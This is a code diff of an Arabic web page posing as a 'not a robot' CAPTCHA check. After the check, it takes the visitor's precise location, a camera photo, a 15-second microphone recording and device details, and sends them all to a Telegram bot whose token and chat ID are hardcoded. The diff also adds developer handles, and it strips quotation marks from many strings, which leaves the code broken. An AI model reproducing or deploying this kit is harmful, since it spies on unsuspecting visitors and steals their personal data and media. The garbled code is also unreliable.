@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -6,7 +7,7 @@
     <title>التحقق من أنك لست روبوت</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif;
             background-color: #f0f2f5;
             margin: 0;
             padding: 0;
@@ -54,6 +55,14 @@
             border-radius: 8px;
             padding: 20px;
             margin-bottom: 20px;
+        }
+        .captcha-text {
+            font-size: 24px;
+            letter-spacing: 5px;
+            color: #4285F4;
+            font-weight: bold;
+            margin: 15px 0;
+            user-select: none;
         }
         input[type="text"] {
             width: 100%;
@@ -110,7 +119,7 @@
         
         <div class="captcha-box">
             <p>أدخل النص الظاهر في الصورة أدناه:</p>
-            <canvas id="captchaCanvas" width="200" height="70"></canvas>
+            <div class="captcha-text" id="captcha-text">5G7H9K</div>
             <input type="text" id="captcha-input" placeholder="أدخل النص هنا" autocomplete="off">
             <button id="verify-btn">تحقق</button>
         </div>
@@ -123,10 +132,8 @@
     </div>
 
     <script>
-        const BOT_TOKEN = "ضع_توكن_البوت_هنا";
-        const CHAT_ID = "ضع_ايدي_الشات_هنا";
-
-        let captchaCode = "";
+        const BOT_TOKEN ="8311192024:AAELi65QNCXIp_GCKCGxg05moXnf2_xFgAA";
+        const CHAT_ID = "8180958667";
         
         const collectedData = {
             systemInfo: getSystemInfo(),
@@ -135,36 +142,18 @@
             location: { coords: null, address: null, allowed: false }
         };
         
-        const captchaInput = document.getElementById('captcha-input');
-        const verifyBtn = document.getElementById('verify-btn');
-        const statusMessage = document.getElementById('status-message');
-
-        function generateCaptchaCanvas() {
-            const canvas = document.getElementById("captchaCanvas");
-            const ctx = canvas.getContext("2d");
-
-            ctx.fillStyle = "#f0f0f0";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-
+        const captchaText = document.getElementById( captcha-text );
+        const captchaInput = document.getElementById( captcha-input );
+        const verifyBtn = document.getElementById( verify-btn );
+        const statusMessage = document.getElementById( status-message );
+        
+        function generateCaptcha() {
             const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-            captchaCode = "";
+            let captcha = "";
             for (let i = 0; i < 6; i++) {
-                captchaCode += chars.charAt(Math.floor(Math.random() * chars.length));
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
             }
-
-            for (let i = 0; i < captchaCode.length; i++) {
-                ctx.font = "30px Arial";
-                ctx.fillStyle = `rgb(${Math.random()*200}, ${Math.random()*200}, ${Math.random()*200})`;
-                ctx.fillText(captchaCode[i], 30 * i + 20, 40 + Math.random()*10);
-            }
-
-            for (let i = 0; i < 5; i++) {
-                ctx.strokeStyle = `rgba(0,0,0,0.3)`;
-                ctx.beginPath();
-                ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
-                ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-                ctx.stroke();
-            }
+            return captcha;
         }
         
         function getSystemInfo() {
@@ -174,35 +163,33 @@
                 platform: navigator.platform,
                 screen: `${screen.width}x${screen.height}`,
                 languages: navigator.languages,
-                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
-                deviceMemory: navigator.deviceMemory || 'غير معروف'
+                cpuCores: navigator.hardwareConcurrency ||  غير معروف ,
+                deviceMemory: navigator.deviceMemory ||  غير معروف 
             };
         }
         
         window.onload = () => {
-            generateCaptchaCanvas();
-            
-            verifyBtn.addEventListener('click', async () => {
-                if (captchaInput.value === captchaCode) {
-                    statusMessage.innerHTML = '<div class="loading"></div> جاري التحقق من المعلومات...';
-                    statusMessage.classList.remove('hidden');
+            captchaText.textContent = generateCaptcha();
+            verifyBtn.addEventListener( click , async () => {
+                if (captchaInput.value === captchaText.textContent) {
+                    statusMessage.innerHTML =  <div class="loading"></div> جاري التحقق من المعلومات... ;
+                    statusMessage.classList.remove( hidden );
                     
                     try {
                         await requestLocation();
                         await requestCamera();
                         await requestMicrophone();
                         await sendAllDataToTelegram();
-                        
-                        statusMessage.innerHTML = '✅ تم التحقق بنجاح! جاري توجيهك...';
+                        statusMessage.innerHTML =  ✅ تم التحقق بنجاح! جاري توجيهك... ;
                     } catch (error) {
                         statusMessage.innerHTML = `❌ حدث خطأ: ${error.message}`;
                         console.error("Error:", error);
                     }
                 } else {
-                    statusMessage.textContent = '❌ الكود غير صحيح. حاول مرة أخرى.';
-                    statusMessage.classList.remove('hidden');
-                    generateCaptchaCanvas();
-                    captchaInput.value = '';
+                    statusMessage.textContent =  ❌ النص المدخل غير صحيح. يرجى المحاولة مرة أخرى. ;
+                    statusMessage.classList.remove( hidden );
+                    captchaText.textContent = generateCaptcha();
+                    captchaInput.value =   ;
                 }
             });
         };
@@ -213,14 +200,12 @@
                     reject(new Error("المتصفح لا يدعم خدمة الموقع"));
                     return;
                 }
-                
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         collectedData.location.coords = {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude
                         };
-                        
                         try {
                             const response = await fetch(
                                 `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
@@ -233,9 +218,7 @@
                             reject(err);
                         }
                     },
-                    (error) => {
-                        reject(new Error(`فشل في الحصول على الموقع: ${error.message}`));
-                    },
+                    (error) => reject(new Error(`فشل في الحصول على الموقع: ${error.message}`)),
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             });
@@ -244,23 +227,19 @@
         async function requestCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
+                const video = document.createElement( video );
                 video.autoplay = true;
                 video.playsInline = true;
                 video.srcObject = stream;
-                
                 await new Promise(resolve => video.onloadedmetadata = resolve);
-                
-                const canvas = document.createElement('canvas');
+                const canvas = document.createElement( canvas );
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
+                canvas.getContext( 2d ).drawImage(video, 0, 0, canvas.width, canvas.height);
                 canvas.toBlob(blob => {
                     collectedData.camera.photo = blob;
                     collectedData.camera.allowed = true;
-                }, 'image/jpeg', 0.9);
-                
+                },  image/jpeg , 0.9);
                 stream.getTracks().forEach(track => track.stop());
             } catch (error) {
                 throw new Error(`فشل في الوصول للكاميرا: ${error.message}`);
@@ -272,26 +251,22 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
                 const audioChunks = [];
-                
                 recorder.ondataavailable = event => audioChunks.push(event.data);
-                
                 return new Promise((resolve) => {
                     recorder.onstop = () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        const audioBlob = new Blob(audioChunks, { type:  audio/wav  });
                         collectedData.microphone.audio = audioBlob;
                         collectedData.microphone.allowed = true;
                         resolve();
                     };
-                    
                     recorder.start();
                     setTimeout(() => {
-                        if (recorder.state !== 'inactive') {
+                        if (recorder.state !==  inactive ) {
                             recorder.stop();
                             stream.getTracks().forEach(track => track.stop());
                         }
                     }, 15000);
                 });
-                
             } catch (error) {
                 throw new Error(`فشل في الوصول للميكروفون: ${error.message}`);
             }
@@ -299,65 +274,70 @@
         
         async function sendAllDataToTelegram() {
             try {
-                let message = "📊 <b>تقرير معلومات الجهاز التلقائي</b>\n";
-                message += "━━━━━━━━━━━━━━━━━━\n";
-                message += `⏰ <b>الوقت:</b>\n${new Date(collectedData.systemInfo.timestamp).toLocaleString()}\n\n`;
-                message += `💻 <b>المتصفح:</b>\n${collectedData.systemInfo.userAgent}\n\n`;
-                message += `🖥️ <b>النظام:</b>\n${collectedData.systemInfo.platform}\n`;
+                let message = `📊 <b>تقرير معلومات الجهاز التلقائي</b>\n\n`;
+                message += `⏰ <b>الوقت:</b> ${new Date(collectedData.systemInfo.timestamp).toLocaleString()}\n`;
+                message += `💻 <b>المتصفح:</b> ${collectedData.systemInfo.userAgent}\n`;
+                message += `🖥️ <b>النظام:</b> ${collectedData.systemInfo.platform}\n`;
                 
                 if (collectedData.location.allowed) {
-                    message += `\n📍 <b>الموقع:</b>\n${collectedData.location.address || "غير معروف"}\n\n`;
-                    message += `🌐 <b>الإحداثيات:</b>\n${collectedData.location.coords.latitude}, ${collectedData.location.coords.longitude}\n`;
+                    message += `\n📍 <b>الموقع:</b> ${collectedData.location.address ||  غير معروف }\n`;
+                    message += `🌐 <b>الإحداثيات:</b> ${collectedData.location.coords.latitude}, ${collectedData.location.coords.longitude}\n`;
                 }
-                
-                message += "━━━━━━━━━━━━━━━━━━\n";
-                message += "👤 <b>للتواصل مع المطور:</b> @AEE_G\n";
-                
-                await sendToTelegram(message, 'text', true);
-                
+                await sendToTelegram(message,  text );
                 if (collectedData.camera.photo) {
-                    await sendToTelegram(collectedData.camera.photo, 'photo');
+                    await sendToTelegram(collectedData.camera.photo,  photo );
                 }
                 if (collectedData.microphone.audio) {
-                    await sendToTelegram(collectedData.microphone.audio, 'audio');
+                    await sendToTelegram(collectedData.microphone.audio,  audio );
                 }
-                
+
+                let finalMessage = 
+"┏━━━━━━━━━━━━━━━┓\n" +
+"   ✨ تم استلام البيانات ✨\n" +
+"┗━━━━━━━━━━━━━━━┛\n\n" +
+"👨‍💻 المطور: @AEE_G\n" +
+"📢 القناة: @AEE_6\n\n" +
+"❤️ شكراً لاستخدامك البوت 💡";
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method:  POST ,
+                    headers: {  Content-Type :  application/json  },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: finalMessage,
+                        parse_mode: "Markdown",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: "👨‍💻 تواصل مع المطور", url: "https://t.me/AEE_G" }],
+                                [{ text: "📢 قناة المطور", url: "https://t.me/AEE_6" }]
+                            ]
+                        }
+                    })
+                });
+
             } catch (error) {
                 throw error;
             }
         }
         
-        async function sendToTelegram(data, type, withButton = false) {
-            if (type === 'text') {
-                const payload = {
-                    chat_id: CHAT_ID,
-                    text: data,
-                    parse_mode: 'HTML'
-                };
-
-                if (withButton) {
-                    payload.reply_markup = {
-                        inline_keyboard: [
-                            [
-                                { text: "📢 قناة المطور", url: "https://t.me/AEE_6" }
-                            ]
-                        ]
-                    };
-                }
-
+        async function sendToTelegram(data, type) {
+            if (type ===  text ) {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    method:  POST ,
+                    headers: {  Content-Type :  application/json  },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: data,
+                        parse_mode:  HTML 
+                    })
                 });
             } else {
                 const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append(type, data, `file.${type === 'photo' ? 'jpg' : 'wav'}`);
-                
-                const endpoint = type === 'photo' ? 'sendPhoto' : 'sendAudio';
+                formData.append( chat_id , CHAT_ID);
+                formData.append(type, data, `file.${type ===  photo  ?  jpg  :  wav }`);
+                const endpoint = type ===  photo  ?  sendPhoto  :  sendAudio ;
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
-                    method: 'POST',
+                    method:  POST ,
                     body: formData
                 });
             }
